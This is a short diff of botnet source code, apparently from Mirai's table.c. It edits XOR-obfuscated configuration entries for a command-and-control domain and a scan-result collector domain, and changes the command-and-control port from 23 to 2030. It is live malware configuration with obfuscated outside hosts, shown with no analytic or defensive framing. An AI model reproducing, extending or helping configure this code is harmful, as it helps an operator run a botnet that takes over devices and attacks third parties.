@@ -16,7 +16,7 @@ struct table_value table[TABLE_MAX_KEYS];
 void table_init(void)
 {
     add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x4F\x5B\x40\x4D\x56\x4C\x47\x56\x0C\x4E\x4D\x41\x43\x4E\x22", 19); // cnc.mybotnet.local
-    add_entry(TABLE_CNC_PORT, "\x22\x35", 2);   // 23
+    add_entry(TABLE_CNC_PORT, "\x25\xCC", 2);   // 2030
 
     add_entry(TABLE_SCAN_CB_DOMAIN, "\x41\x4D\x4E\x4E\x47\x41\x56\x4D\x50\x0C\x4F\x5B\x40\x4D\x56\x4C\x47\x56\x0C\x4E\x4D\x41\x43\x4E\x22", 25); // collector.mybotnet.local
     add_entry(TABLE_SCAN_CB_PORT, "\x99\xC7", 2);         // 48101
